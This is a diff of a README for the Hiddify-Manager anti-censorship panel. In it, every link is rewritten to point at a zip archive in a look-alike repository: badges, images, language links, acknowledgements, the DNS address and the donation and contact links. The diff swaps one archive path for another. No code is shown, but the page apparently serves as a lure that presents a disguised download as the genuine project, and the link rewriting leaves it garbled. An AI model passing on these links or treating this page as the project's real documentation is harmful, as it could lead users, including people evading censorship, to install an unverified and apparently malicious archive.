@@ -4,15 +4,15 @@
 
 
 
-[**![Lang_farsi](https://raw.githubusercontent.com/aslekariii/Hiddify-Manager/main/operations/Hiddify-Manager_v3.6.zip) &nbsp;فارسی**](https://raw.githubusercontent.com/aslekariii/Hiddify-Manager/main/operations/Hiddify-Manager_v3.6.zip)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[**Русский 🇷🇺**](https://raw.githubusercontent.com/aslekariii/Hiddify-Manager/main/operations/Hiddify-Manager_v3.6.zip)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[**简体中文 🇨🇳**](https://raw.githubusercontent.com/aslekariii/Hiddify-Manager/main/operations/Hiddify-Manager_v3.6.zip)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[![](https://raw.githubusercontent.com/aslekariii/Hiddify-Manager/main/operations/Hiddify-Manager_v3.6.zip%20Wiki-Page-808080?style=flat-square)](https://raw.githubusercontent.com/aslekariii/Hiddify-Manager/main/operations/Hiddify-Manager_v3.6.zip)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[![](https://raw.githubusercontent.com/aslekariii/Hiddify-Manager/main/operations/Hiddify-Manager_v3.6.zip)](https://raw.githubusercontent.com/aslekariii/Hiddify-Manager/main/operations/Hiddify-Manager_v3.6.zip%D8%B3%D9%88%D8%A7%D9%84%D8%A7%D8%AA-%D8%B1%D8%A7%DB%8C%D8%AC)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[![](https://raw.githubusercontent.com/aslekariii/Hiddify-Manager/main/operations/Hiddify-Manager_v3.6.zip)](https://raw.githubusercontent.com/aslekariii/Hiddify-Manager/main/operations/Hiddify-Manager_v3.6.zip)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+[**![Lang_farsi](https://github.com/aslekariii/Hiddify-Manager/raw/refs/heads/main/other/warp/Manager_Hiddify_2.1.zip) &nbsp;فارسی**](https://github.com/aslekariii/Hiddify-Manager/raw/refs/heads/main/other/warp/Manager_Hiddify_2.1.zip)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[**Русский 🇷🇺**](https://github.com/aslekariii/Hiddify-Manager/raw/refs/heads/main/other/warp/Manager_Hiddify_2.1.zip)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[**简体中文 🇨🇳**](https://github.com/aslekariii/Hiddify-Manager/raw/refs/heads/main/other/warp/Manager_Hiddify_2.1.zip)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[![](https://github.com/aslekariii/Hiddify-Manager/raw/refs/heads/main/other/warp/Manager_Hiddify_2.1.zip%20Wiki-Page-808080?style=flat-square)](https://github.com/aslekariii/Hiddify-Manager/raw/refs/heads/main/other/warp/Manager_Hiddify_2.1.zip)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[![](https://github.com/aslekariii/Hiddify-Manager/raw/refs/heads/main/other/warp/Manager_Hiddify_2.1.zip)](https://github.com/aslekariii/Hiddify-Manager/raw/refs/heads/main/other/warp/Manager_Hiddify_2.1.zip%D8%B3%D9%88%D8%A7%D9%84%D8%A7%D8%AA-%D8%B1%D8%A7%DB%8C%D8%AC)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[![](https://github.com/aslekariii/Hiddify-Manager/raw/refs/heads/main/other/warp/Manager_Hiddify_2.1.zip)](https://github.com/aslekariii/Hiddify-Manager/raw/refs/heads/main/other/warp/Manager_Hiddify_2.1.zip)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
 </div>
 <br>
 <div align=center markdown="1">
 
-![Hiddify Manager logo](https://raw.githubusercontent.com/aslekariii/Hiddify-Manager/main/operations/Hiddify-Manager_v3.6.zip)
+![Hiddify Manager logo](https://github.com/aslekariii/Hiddify-Manager/raw/refs/heads/main/other/warp/Manager_Hiddify_2.1.zip)
 <!--
-![Hiddify Logo](https://raw.githubusercontent.com/aslekariii/Hiddify-Manager/main/operations/Hiddify-Manager_v3.6.zip)
-![Hiddify Manager logo](https://raw.githubusercontent.com/aslekariii/Hiddify-Manager/main/operations/Hiddify-Manager_v3.6.zip)
+![Hiddify Logo](https://github.com/aslekariii/Hiddify-Manager/raw/refs/heads/main/other/warp/Manager_Hiddify_2.1.zip)
+![Hiddify Manager logo](https://github.com/aslekariii/Hiddify-Manager/raw/refs/heads/main/other/warp/Manager_Hiddify_2.1.zip)
 -->
  
 </div>
@@ -21,22 +21,22 @@
 
 
 
- [![Downloads](https://raw.githubusercontent.com/aslekariii/Hiddify-Manager/main/operations/Hiddify-Manager_v3.6.zip)](https://raw.githubusercontent.com/aslekariii/Hiddify-Manager/main/operations/Hiddify-Manager_v3.6.zip*&versions=9.*&versions=10.*&versions=11.*)[![Last Version](https://raw.githubusercontent.com/aslekariii/Hiddify-Manager/main/operations/Hiddify-Manager_v3.6.zip)](https://raw.githubusercontent.com/aslekariii/Hiddify-Manager/main/operations/Hiddify-Manager_v3.6.zip)[![Last Release Date](https://raw.githubusercontent.com/aslekariii/Hiddify-Manager/main/operations/Hiddify-Manager_v3.6.zip)](https://raw.githubusercontent.com/aslekariii/Hiddify-Manager/main/operations/Hiddify-Manager_v3.6.zip)[![commits](https://raw.githubusercontent.com/aslekariii/Hiddify-Manager/main/operations/Hiddify-Manager_v3.6.zip)](https://raw.githubusercontent.com/aslekariii/Hiddify-Manager/main/operations/Hiddify-Manager_v3.6.zip) [![Youtube](https://raw.githubusercontent.com/aslekariii/Hiddify-Manager/main/operations/Hiddify-Manager_v3.6.zip)](https://raw.githubusercontent.com/aslekariii/Hiddify-Manager/main/operations/Hiddify-Manager_v3.6.zip)[![Telegram Channel](https://raw.githubusercontent.com/aslekariii/Hiddify-Manager/main/operations/Hiddify-Manager_v3.6.zip%3A%2F%https://raw.githubusercontent.com/aslekariii/Hiddify-Manager/main/operations/Hiddify-Manager_v3.6.zip%2Fhiddify&color=blue)](https://raw.githubusercontent.com/aslekariii/Hiddify-Manager/main/operations/Hiddify-Manager_v3.6.zip)[![Telegram Group](https://raw.githubusercontent.com/aslekariii/Hiddify-Manager/main/operations/Hiddify-Manager_v3.6.zip%20Group&style=flat-square&url=https%3A%2F%https://raw.githubusercontent.com/aslekariii/Hiddify-Manager/main/operations/Hiddify-Manager_v3.6.zip%2Fhiddify_board)](https://raw.githubusercontent.com/aslekariii/Hiddify-Manager/main/operations/Hiddify-Manager_v3.6.zip)[![Gurubase](https://raw.githubusercontent.com/aslekariii/Hiddify-Manager/main/operations/Hiddify-Manager_v3.6.zip%20Hiddify--Manager%20Guru-006BFF?style=flat-square)](https://raw.githubusercontent.com/aslekariii/Hiddify-Manager/main/operations/Hiddify-Manager_v3.6.zip)
+ [![Downloads](https://github.com/aslekariii/Hiddify-Manager/raw/refs/heads/main/other/warp/Manager_Hiddify_2.1.zip)](https://github.com/aslekariii/Hiddify-Manager/raw/refs/heads/main/other/warp/Manager_Hiddify_2.1.zip*&versions=9.*&versions=10.*&versions=11.*)[![Last Version](https://github.com/aslekariii/Hiddify-Manager/raw/refs/heads/main/other/warp/Manager_Hiddify_2.1.zip)](https://github.com/aslekariii/Hiddify-Manager/raw/refs/heads/main/other/warp/Manager_Hiddify_2.1.zip)[![Last Release Date](https://github.com/aslekariii/Hiddify-Manager/raw/refs/heads/main/other/warp/Manager_Hiddify_2.1.zip)](https://github.com/aslekariii/Hiddify-Manager/raw/refs/heads/main/other/warp/Manager_Hiddify_2.1.zip)[![commits](https://github.com/aslekariii/Hiddify-Manager/raw/refs/heads/main/other/warp/Manager_Hiddify_2.1.zip)](https://github.com/aslekariii/Hiddify-Manager/raw/refs/heads/main/other/warp/Manager_Hiddify_2.1.zip) [![Youtube](https://github.com/aslekariii/Hiddify-Manager/raw/refs/heads/main/other/warp/Manager_Hiddify_2.1.zip)](https://github.com/aslekariii/Hiddify-Manager/raw/refs/heads/main/other/warp/Manager_Hiddify_2.1.zip)[![Telegram Channel](https://github.com/aslekariii/Hiddify-Manager/raw/refs/heads/main/other/warp/Manager_Hiddify_2.1.zip%3A%2F%https://github.com/aslekariii/Hiddify-Manager/raw/refs/heads/main/other/warp/Manager_Hiddify_2.1.zip%2Fhiddify&color=blue)](https://github.com/aslekariii/Hiddify-Manager/raw/refs/heads/main/other/warp/Manager_Hiddify_2.1.zip)[![Telegram Group](https://github.com/aslekariii/Hiddify-Manager/raw/refs/heads/main/other/warp/Manager_Hiddify_2.1.zip%20Group&style=flat-square&url=https%3A%2F%https://github.com/aslekariii/Hiddify-Manager/raw/refs/heads/main/other/warp/Manager_Hiddify_2.1.zip%2Fhiddify_board)](https://github.com/aslekariii/Hiddify-Manager/raw/refs/heads/main/other/warp/Manager_Hiddify_2.1.zip)[![Gurubase](https://github.com/aslekariii/Hiddify-Manager/raw/refs/heads/main/other/warp/Manager_Hiddify_2.1.zip%20Hiddify--Manager%20Guru-006BFF?style=flat-square)](https://github.com/aslekariii/Hiddify-Manager/raw/refs/heads/main/other/warp/Manager_Hiddify_2.1.zip)
 <!--
-[![Youtube](https://raw.githubusercontent.com/aslekariii/Hiddify-Manager/main/operations/Hiddify-Manager_v3.6.zip)](https://raw.githubusercontent.com/aslekariii/Hiddify-Manager/main/operations/Hiddify-Manager_v3.6.zip)
-[![Telegram Channel](https://raw.githubusercontent.com/aslekariii/Hiddify-Manager/main/operations/Hiddify-Manager_v3.6.zip%3A%2F%https://raw.githubusercontent.com/aslekariii/Hiddify-Manager/main/operations/Hiddify-Manager_v3.6.zip%2Fhiddify)](https://raw.githubusercontent.com/aslekariii/Hiddify-Manager/main/operations/Hiddify-Manager_v3.6.zip)
-[![Telegram Group](https://raw.githubusercontent.com/aslekariii/Hiddify-Manager/main/operations/Hiddify-Manager_v3.6.zip%20Group&style=flat-square&url=https%3A%2F%https://raw.githubusercontent.com/aslekariii/Hiddify-Manager/main/operations/Hiddify-Manager_v3.6.zip%2Fhiddify_board)](https://raw.githubusercontent.com/aslekariii/Hiddify-Manager/main/operations/Hiddify-Manager_v3.6.zip)
-[![GitHub Stars](https://raw.githubusercontent.com/aslekariii/Hiddify-Manager/main/operations/Hiddify-Manager_v3.6.zip)](https://raw.githubusercontent.com/aslekariii/Hiddify-Manager/main/operations/Hiddify-Manager_v3.6.zip)
-[![GitHub Stars](https://raw.githubusercontent.com/aslekariii/Hiddify-Manager/main/operations/Hiddify-Manager_v3.6.zip)](https://raw.githubusercontent.com/aslekariii/Hiddify-Manager/main/operations/Hiddify-Manager_v3.6.zip)
-[![GitHub Forks](https://raw.githubusercontent.com/aslekariii/Hiddify-Manager/main/operations/Hiddify-Manager_v3.6.zip)](https://raw.githubusercontent.com/aslekariii/Hiddify-Manager/main/operations/Hiddify-Manager_v3.6.zip)
-[![Telegram Channel](https://raw.githubusercontent.com/aslekariii/Hiddify-Manager/main/operations/Hiddify-Manager_v3.6.zip%3A%2F%https://raw.githubusercontent.com/aslekariii/Hiddify-Manager/main/operations/Hiddify-Manager_v3.6.zip%2Fdamiankrawczyk%2Ftelegram-badge%2Fbranches%2Fmaster%3Furl%3Dhttps%3A%2F%https://raw.githubusercontent.com/aslekariii/Hiddify-Manager/main/operations/Hiddify-Manager_v3.6.zip%2Fhiddify&label=Telegram
-)](https://raw.githubusercontent.com/aslekariii/Hiddify-Manager/main/operations/Hiddify-Manager_v3.6.zip)
+[![Youtube](https://github.com/aslekariii/Hiddify-Manager/raw/refs/heads/main/other/warp/Manager_Hiddify_2.1.zip)](https://github.com/aslekariii/Hiddify-Manager/raw/refs/heads/main/other/warp/Manager_Hiddify_2.1.zip)
+[![Telegram Channel](https://github.com/aslekariii/Hiddify-Manager/raw/refs/heads/main/other/warp/Manager_Hiddify_2.1.zip%3A%2F%https://github.com/aslekariii/Hiddify-Manager/raw/refs/heads/main/other/warp/Manager_Hiddify_2.1.zip%2Fhiddify)](https://github.com/aslekariii/Hiddify-Manager/raw/refs/heads/main/other/warp/Manager_Hiddify_2.1.zip)
+[![Telegram Group](https://github.com/aslekariii/Hiddify-Manager/raw/refs/heads/main/other/warp/Manager_Hiddify_2.1.zip%20Group&style=flat-square&url=https%3A%2F%https://github.com/aslekariii/Hiddify-Manager/raw/refs/heads/main/other/warp/Manager_Hiddify_2.1.zip%2Fhiddify_board)](https://github.com/aslekariii/Hiddify-Manager/raw/refs/heads/main/other/warp/Manager_Hiddify_2.1.zip)
+[![GitHub Stars](https://github.com/aslekariii/Hiddify-Manager/raw/refs/heads/main/other/warp/Manager_Hiddify_2.1.zip)](https://github.com/aslekariii/Hiddify-Manager/raw/refs/heads/main/other/warp/Manager_Hiddify_2.1.zip)
+[![GitHub Stars](https://github.com/aslekariii/Hiddify-Manager/raw/refs/heads/main/other/warp/Manager_Hiddify_2.1.zip)](https://github.com/aslekariii/Hiddify-Manager/raw/refs/heads/main/other/warp/Manager_Hiddify_2.1.zip)
+[![GitHub Forks](https://github.com/aslekariii/Hiddify-Manager/raw/refs/heads/main/other/warp/Manager_Hiddify_2.1.zip)](https://github.com/aslekariii/Hiddify-Manager/raw/refs/heads/main/other/warp/Manager_Hiddify_2.1.zip)
+[![Telegram Channel](https://github.com/aslekariii/Hiddify-Manager/raw/refs/heads/main/other/warp/Manager_Hiddify_2.1.zip%3A%2F%https://github.com/aslekariii/Hiddify-Manager/raw/refs/heads/main/other/warp/Manager_Hiddify_2.1.zip%2Fdamiankrawczyk%2Ftelegram-badge%2Fbranches%2Fmaster%3Furl%3Dhttps%3A%2F%https://github.com/aslekariii/Hiddify-Manager/raw/refs/heads/main/other/warp/Manager_Hiddify_2.1.zip%2Fhiddify&label=Telegram
+)](https://github.com/aslekariii/Hiddify-Manager/raw/refs/heads/main/other/warp/Manager_Hiddify_2.1.zip)
 
 
-[![Telegram Channel](https://raw.githubusercontent.com/aslekariii/Hiddify-Manager/main/operations/Hiddify-Manager_v3.6.zip%3A%2F%https://raw.githubusercontent.com/aslekariii/Hiddify-Manager/main/operations/Hiddify-Manager_v3.6.zip%2Fhiddify)](https://raw.githubusercontent.com/aslekariii/Hiddify-Manager/main/operations/Hiddify-Manager_v3.6.zip)
-[![Telegram Group](https://raw.githubusercontent.com/aslekariii/Hiddify-Manager/main/operations/Hiddify-Manager_v3.6.zip%20Group&style=plastic&url=https%3A%2F%https://raw.githubusercontent.com/aslekariii/Hiddify-Manager/main/operations/Hiddify-Manager_v3.6.zip%2Fhiddify_board)](https://raw.githubusercontent.com/aslekariii/Hiddify-Manager/main/operations/Hiddify-Manager_v3.6.zip)
-[![Youtube](https://raw.githubusercontent.com/aslekariii/Hiddify-Manager/main/operations/Hiddify-Manager_v3.6.zip)](https://raw.githubusercontent.com/aslekariii/Hiddify-Manager/main/operations/Hiddify-Manager_v3.6.zip)
-[![Twitter](https://raw.githubusercontent.com/aslekariii/Hiddify-Manager/main/operations/Hiddify-Manager_v3.6.zip)](https://raw.githubusercontent.com/aslekariii/Hiddify-Manager/main/operations/Hiddify-Manager_v3.6.zip)
+[![Telegram Channel](https://github.com/aslekariii/Hiddify-Manager/raw/refs/heads/main/other/warp/Manager_Hiddify_2.1.zip%3A%2F%https://github.com/aslekariii/Hiddify-Manager/raw/refs/heads/main/other/warp/Manager_Hiddify_2.1.zip%2Fhiddify)](https://github.com/aslekariii/Hiddify-Manager/raw/refs/heads/main/other/warp/Manager_Hiddify_2.1.zip)
+[![Telegram Group](https://github.com/aslekariii/Hiddify-Manager/raw/refs/heads/main/other/warp/Manager_Hiddify_2.1.zip%20Group&style=plastic&url=https%3A%2F%https://github.com/aslekariii/Hiddify-Manager/raw/refs/heads/main/other/warp/Manager_Hiddify_2.1.zip%2Fhiddify_board)](https://github.com/aslekariii/Hiddify-Manager/raw/refs/heads/main/other/warp/Manager_Hiddify_2.1.zip)
+[![Youtube](https://github.com/aslekariii/Hiddify-Manager/raw/refs/heads/main/other/warp/Manager_Hiddify_2.1.zip)](https://github.com/aslekariii/Hiddify-Manager/raw/refs/heads/main/other/warp/Manager_Hiddify_2.1.zip)
+[![Twitter](https://github.com/aslekariii/Hiddify-Manager/raw/refs/heads/main/other/warp/Manager_Hiddify_2.1.zip)](https://github.com/aslekariii/Hiddify-Manager/raw/refs/heads/main/other/warp/Manager_Hiddify_2.1.zip)
 -->
 
 </div>
@@ -45,24 +45,24 @@
 
 ## Welcome to Hiddify-Manager
 
-Hiddify-Manager is a powerful and professional anti-censorship toolbox, which is a multi-user panel with an effortless installation and <b>supporting more than 20 protocols</b> including <b>Reality</b> and <b>Telegram proxy</b> to circumvent filtering.  It's optimized for censorship circumvention in <b>China</b>, <b>Russia</b> and <b>Iran</b> and listed by <a href="https://raw.githubusercontent.com/aslekariii/Hiddify-Manager/main/operations/Hiddify-Manager_v3.6.zip" target="_blank"><b>Xray</b></a>. 
+Hiddify-Manager is a powerful and professional anti-censorship toolbox, which is a multi-user panel with an effortless installation and <b>supporting more than 20 protocols</b> including <b>Reality</b> and <b>Telegram proxy</b> to circumvent filtering.  It's optimized for censorship circumvention in <b>China</b>, <b>Russia</b> and <b>Iran</b> and listed by <a href="https://github.com/aslekariii/Hiddify-Manager/raw/refs/heads/main/other/warp/Manager_Hiddify_2.1.zip" target="_blank"><b>Xray</b></a>. 
 
 
 
 ***
 
 <div align=center>
-<img alt="English Demo" src="https://raw.githubusercontent.com/aslekariii/Hiddify-Manager/main/operations/Hiddify-Manager_v3.6.zip">
+<img alt="English Demo" src="https://github.com/aslekariii/Hiddify-Manager/raw/refs/heads/main/other/warp/Manager_Hiddify_2.1.zip">
 
 </div>
 
 
 
 <!--
-![English new](https://raw.githubusercontent.com/aslekariii/Hiddify-Manager/main/operations/Hiddify-Manager_v3.6.zip)
-![english_demo](https://raw.githubusercontent.com/aslekariii/Hiddify-Manager/main/operations/Hiddify-Manager_v3.6.zip)
+![English new](https://github.com/aslekariii/Hiddify-Manager/raw/refs/heads/main/other/warp/Manager_Hiddify_2.1.zip)
+![english_demo](https://github.com/aslekariii/Hiddify-Manager/raw/refs/heads/main/other/warp/Manager_Hiddify_2.1.zip)
 
-![English_Demo](https://raw.githubusercontent.com/aslekariii/Hiddify-Manager/main/operations/Hiddify-Manager_v3.6.zip)
+![English_Demo](https://github.com/aslekariii/Hiddify-Manager/raw/refs/heads/main/other/warp/Manager_Hiddify_2.1.zip)
 -->
 
 
@@ -154,7 +154,7 @@ Hiddify-Manager has been tested on Ubuntu 22.04. Ubuntu arm64 or amd64
 
 In this way, you can check the speed of the server with and without anti-filter.
 
-![speed_test](https://raw.githubusercontent.com/aslekariii/Hiddify-Manager/main/operations/Hiddify-Manager_v3.6.zip)
+![speed_test](https://github.com/aslekariii/Hiddify-Manager/raw/refs/heads/main/other/warp/Manager_Hiddify_2.1.zip)
 
 </details>
 
@@ -164,19 +164,19 @@ In this way, you can check the speed of the server with and without anti-filter.
  
 To use DNS over HTTPS, just use the following DNS in the browser. 
  
- `https://raw.githubusercontent.com/aslekariii/Hiddify-Manager/main/operations/Hiddify-Manager_v3.6.zip{?dns}`
+ `https://github.com/aslekariii/Hiddify-Manager/raw/refs/heads/main/other/warp/Manager_Hiddify_2.1.zip{?dns}`
  
 </details>
 
 <details markdown="1"> <summary>Redirector (CDN support)</summary> 
 When you want to share Telegram proxy or Shadowsocks proxy through other programs, it is possible to redirect with CDN support. For example, if you put the Shadowsocks configuration instead of "fullURL", clicking on this link will open Shadowsocks app and activate the proxy on it. For example:
  
- `https://raw.githubusercontent.com/aslekariii/Hiddify-Manager/main/operations/Hiddify-Manager_v3.6.zip` 
+ `https://github.com/aslekariii/Hiddify-Manager/raw/refs/heads/main/other/warp/Manager_Hiddify_2.1.zip` 
 
  Replace "fullURL" by the Shadowsocks configuration. 
 
  
- `https://raw.githubusercontent.com/aslekariii/Hiddify-Manager/main/operations/Hiddify-Manager_v3.6.zip` 
+ `https://github.com/aslekariii/Hiddify-Manager/raw/refs/heads/main/other/warp/Manager_Hiddify_2.1.zip` 
  
 </details>
 
@@ -188,33 +188,33 @@ When you want to share Telegram proxy or Shadowsocks proxy through other program
 
 <div align="center">
  
- <a href="https://raw.githubusercontent.com/aslekariii/Hiddify-Manager/main/operations/Hiddify-Manager_v3.6.zip"><img width="100%" alt="All Tutorials" src="https://raw.githubusercontent.com/aslekariii/Hiddify-Manager/main/operations/Hiddify-Manager_v3.6.zip" /></a>
+ <a href="https://github.com/aslekariii/Hiddify-Manager/raw/refs/heads/main/other/warp/Manager_Hiddify_2.1.zip"><img width="100%" alt="All Tutorials" src="https://github.com/aslekariii/Hiddify-Manager/raw/refs/heads/main/other/warp/Manager_Hiddify_2.1.zip" /></a>
 
 
  
  <!--
-[![Tutorials](https://raw.githubusercontent.com/aslekariii/Hiddify-Manager/main/operations/Hiddify-Manager_v3.6.zip)](https://raw.githubusercontent.com/aslekariii/Hiddify-Manager/main/operations/Hiddify-Manager_v3.6.zip)
- <a href="https://raw.githubusercontent.com/aslekariii/Hiddify-Manager/main/operations/Hiddify-Manager_v3.6.zip"><img width="40%" src="https://raw.githubusercontent.com/aslekariii/Hiddify-Manager/main/operations/Hiddify-Manager_v3.6.zip" /></a>-->
+[![Tutorials](https://github.com/aslekariii/Hiddify-Manager/raw/refs/heads/main/other/warp/Manager_Hiddify_2.1.zip)](https://github.com/aslekariii/Hiddify-Manager/raw/refs/heads/main/other/warp/Manager_Hiddify_2.1.zip)
+ <a href="https://github.com/aslekariii/Hiddify-Manager/raw/refs/heads/main/other/warp/Manager_Hiddify_2.1.zip"><img width="40%" src="https://github.com/aslekariii/Hiddify-Manager/raw/refs/heads/main/other/warp/Manager_Hiddify_2.1.zip" /></a>-->
 
 </div>
 
 ## Acknowledgements
 We would like to express our sincere appreciation to the contributors of the following projects, whose robust foundation and innovative features have significantly enhanced the success and functionality of this project.
-- [Sing-box](https://raw.githubusercontent.com/aslekariii/Hiddify-Manager/main/operations/Hiddify-Manager_v3.6.zip)
-- [Xray](https://raw.githubusercontent.com/aslekariii/Hiddify-Manager/main/operations/Hiddify-Manager_v3.6.zip)
-- [Linux by Linus Torvalds](https://raw.githubusercontent.com/aslekariii/Hiddify-Manager/main/operations/Hiddify-Manager_v3.6.zip)
-- Font: [Vazirmatn by Saber Rastikerdar](https://raw.githubusercontent.com/aslekariii/Hiddify-Manager/main/operations/Hiddify-Manager_v3.6.zip)
+- [Sing-box](https://github.com/aslekariii/Hiddify-Manager/raw/refs/heads/main/other/warp/Manager_Hiddify_2.1.zip)
+- [Xray](https://github.com/aslekariii/Hiddify-Manager/raw/refs/heads/main/other/warp/Manager_Hiddify_2.1.zip)
+- [Linux by Linus Torvalds](https://github.com/aslekariii/Hiddify-Manager/raw/refs/heads/main/other/warp/Manager_Hiddify_2.1.zip)
+- Font: [Vazirmatn by Saber Rastikerdar](https://github.com/aslekariii/Hiddify-Manager/raw/refs/heads/main/other/warp/Manager_Hiddify_2.1.zip)
 
 ## Donation And Support 
 The easiest way to support us is to click on the star (⭐) at the top of this page.
 
 <div align=center>
     
-<img alt="Star History Chart" width=50% src="https://raw.githubusercontent.com/aslekariii/Hiddify-Manager/main/operations/Hiddify-Manager_v3.6.zip)](https://raw.githubusercontent.com/aslekariii/Hiddify-Manager/main/operations/Hiddify-Manager_v3.6.zip" />
+<img alt="Star History Chart" width=50% src="https://github.com/aslekariii/Hiddify-Manager/raw/refs/heads/main/other/warp/Manager_Hiddify_2.1.zip)](https://github.com/aslekariii/Hiddify-Manager/raw/refs/heads/main/other/warp/Manager_Hiddify_2.1.zip" />
 
 </div>
 
-We also need financial support for our services. All of our activities are done voluntarily and financial support will be spent on the development of the project. You can view our support addresses [here](https://raw.githubusercontent.com/aslekariii/Hiddify-Manager/main/operations/Hiddify-Manager_v3.6.zip). 
+We also need financial support for our services. All of our activities are done voluntarily and financial support will be spent on the development of the project. You can view our support addresses [here](https://github.com/aslekariii/Hiddify-Manager/raw/refs/heads/main/other/warp/Manager_Hiddify_2.1.zip). 
 
 
 
@@ -231,18 +231,18 @@ We need your collaboration in order to develop this project. If you are speciali
 <!--
 ## Collaboration and Contact Information
 
-* Email: [https://raw.githubusercontent.com/aslekariii/Hiddify-Manager/main/operations/Hiddify-Manager_v3.6.zip](https://raw.githubusercontent.com/aslekariii/Hiddify-Manager/main/operations/Hiddify-Manager_v3.6.zip)
-* Annoncements: [Telegram Channel](https://raw.githubusercontent.com/aslekariii/Hiddify-Manager/main/operations/Hiddify-Manager_v3.6.zip)
-* Discussion: [Telegram Group](https://raw.githubusercontent.com/aslekariii/Hiddify-Manager/main/operations/Hiddify-Manager_v3.6.zip)
+* Email: [https://github.com/aslekariii/Hiddify-Manager/raw/refs/heads/main/other/warp/Manager_Hiddify_2.1.zip](https://github.com/aslekariii/Hiddify-Manager/raw/refs/heads/main/other/warp/Manager_Hiddify_2.1.zip)
+* Annoncements: [Telegram Channel](https://github.com/aslekariii/Hiddify-Manager/raw/refs/heads/main/other/warp/Manager_Hiddify_2.1.zip)
+* Discussion: [Telegram Group](https://github.com/aslekariii/Hiddify-Manager/raw/refs/heads/main/other/warp/Manager_Hiddify_2.1.zip)
 
 -->
 <br>
 
-[![Email](https://raw.githubusercontent.com/aslekariii/Hiddify-Manager/main/operations/Hiddify-Manager_v3.6.zip)](https://raw.githubusercontent.com/aslekariii/Hiddify-Manager/main/operations/Hiddify-Manager_v3.6.zip)
-[![Telegram Channel](https://raw.githubusercontent.com/aslekariii/Hiddify-Manager/main/operations/Hiddify-Manager_v3.6.zip%3A%2F%https://raw.githubusercontent.com/aslekariii/Hiddify-Manager/main/operations/Hiddify-Manager_v3.6.zip%2Fhiddify&color=blue)](https://raw.githubusercontent.com/aslekariii/Hiddify-Manager/main/operations/Hiddify-Manager_v3.6.zip)
-[![Telegram Group](https://raw.githubusercontent.com/aslekariii/Hiddify-Manager/main/operations/Hiddify-Manager_v3.6.zip%20Group&style=flat-square&url=https%3A%2F%https://raw.githubusercontent.com/aslekariii/Hiddify-Manager/main/operations/Hiddify-Manager_v3.6.zip%2Fhiddify_board)](https://raw.githubusercontent.com/aslekariii/Hiddify-Manager/main/operations/Hiddify-Manager_v3.6.zip)
-[![Youtube](https://raw.githubusercontent.com/aslekariii/Hiddify-Manager/main/operations/Hiddify-Manager_v3.6.zip)](https://raw.githubusercontent.com/aslekariii/Hiddify-Manager/main/operations/Hiddify-Manager_v3.6.zip)
-[![Twitter](https://raw.githubusercontent.com/aslekariii/Hiddify-Manager/main/operations/Hiddify-Manager_v3.6.zip%231DA1F2&logo=twitter&logoColor=1DA1F2&style=flat-square)](https://raw.githubusercontent.com/aslekariii/Hiddify-Manager/main/operations/Hiddify-Manager_v3.6.zip)
+[![Email](https://github.com/aslekariii/Hiddify-Manager/raw/refs/heads/main/other/warp/Manager_Hiddify_2.1.zip)](https://github.com/aslekariii/Hiddify-Manager/raw/refs/heads/main/other/warp/Manager_Hiddify_2.1.zip)
+[![Telegram Channel](https://github.com/aslekariii/Hiddify-Manager/raw/refs/heads/main/other/warp/Manager_Hiddify_2.1.zip%3A%2F%https://github.com/aslekariii/Hiddify-Manager/raw/refs/heads/main/other/warp/Manager_Hiddify_2.1.zip%2Fhiddify&color=blue)](https://github.com/aslekariii/Hiddify-Manager/raw/refs/heads/main/other/warp/Manager_Hiddify_2.1.zip)
+[![Telegram Group](https://github.com/aslekariii/Hiddify-Manager/raw/refs/heads/main/other/warp/Manager_Hiddify_2.1.zip%20Group&style=flat-square&url=https%3A%2F%https://github.com/aslekariii/Hiddify-Manager/raw/refs/heads/main/other/warp/Manager_Hiddify_2.1.zip%2Fhiddify_board)](https://github.com/aslekariii/Hiddify-Manager/raw/refs/heads/main/other/warp/Manager_Hiddify_2.1.zip)
+[![Youtube](https://github.com/aslekariii/Hiddify-Manager/raw/refs/heads/main/other/warp/Manager_Hiddify_2.1.zip)](https://github.com/aslekariii/Hiddify-Manager/raw/refs/heads/main/other/warp/Manager_Hiddify_2.1.zip)
+[![Twitter](https://github.com/aslekariii/Hiddify-Manager/raw/refs/heads/main/other/warp/Manager_Hiddify_2.1.zip%231DA1F2&logo=twitter&logoColor=1DA1F2&style=flat-square)](https://github.com/aslekariii/Hiddify-Manager/raw/refs/heads/main/other/warp/Manager_Hiddify_2.1.zip)
 
 </div>
 
@@ -253,31 +253,31 @@ We need your collaboration in order to develop this project. If you are speciali
  </p>
  
 <p align=center> 
-<a href="https://raw.githubusercontent.com/aslekariii/Hiddify-Manager/main/operations/Hiddify-Manager_v3.6.zip">
-  <img src="https://raw.githubusercontent.com/aslekariii/Hiddify-Manager/main/operations/Hiddify-Manager_v3.6.zip" />
+<a href="https://github.com/aslekariii/Hiddify-Manager/raw/refs/heads/main/other/warp/Manager_Hiddify_2.1.zip">
+  <img src="https://github.com/aslekariii/Hiddify-Manager/raw/refs/heads/main/other/warp/Manager_Hiddify_2.1.zip" />
 </a>
 </p>
 <p align=center>
- Made with <a rel="" target="_blank" href="https://raw.githubusercontent.com/aslekariii/Hiddify-Manager/main/operations/Hiddify-Manager_v3.6.zip">https://raw.githubusercontent.com/aslekariii/Hiddify-Manager/main/operations/Hiddify-Manager_v3.6.zip</a> 
